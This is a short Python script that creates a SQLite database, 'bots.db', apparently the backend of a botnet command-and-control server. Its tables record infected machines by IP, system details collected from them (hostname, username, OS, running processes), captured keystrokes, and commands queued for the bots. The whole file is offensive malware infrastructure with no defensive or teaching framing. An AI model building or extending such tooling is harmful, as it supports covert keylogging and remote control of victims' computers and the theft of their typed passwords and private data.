import sqlite3

# Connect to (or create) the database file
conn = sqlite3.connect('bots.db')

# Create a cursor object
cursor = conn.cursor()

# Create the "bots" table
cursor.execute("""
    CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        last_seen TEXT DEFAULT (datetime('now', 'localtime'))
    )
""")

# Create the "system_info" table (stores data collected from bots)
cursor.execute("""
    CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER,
        hostname TEXT,
        username TEXT,
        os TEXT,
        ip TEXT,
        running_processes TEXT,
        last_updated TEXT DEFAULT (datetime('now', 'localtime'))
    )
""")

# Create the "keylogs" table (stores keystroke data)
cursor.execute("""
    CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER,
        keylogs TEXT,
        timestamp TEXT DEFAULT (datetime('now', 'localtime'))
    )
""")

# Create the "commands" table (stores commands sent to bots)
cursor.execute("""
    CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER,
        command TEXT,
        timestamp TEXT DEFAULT (datetime('now', 'localtime'))
    )
""")

# Commit changes and close connection
conn.commit()
conn.close()

print("Database 'bots.db' created successfully!")
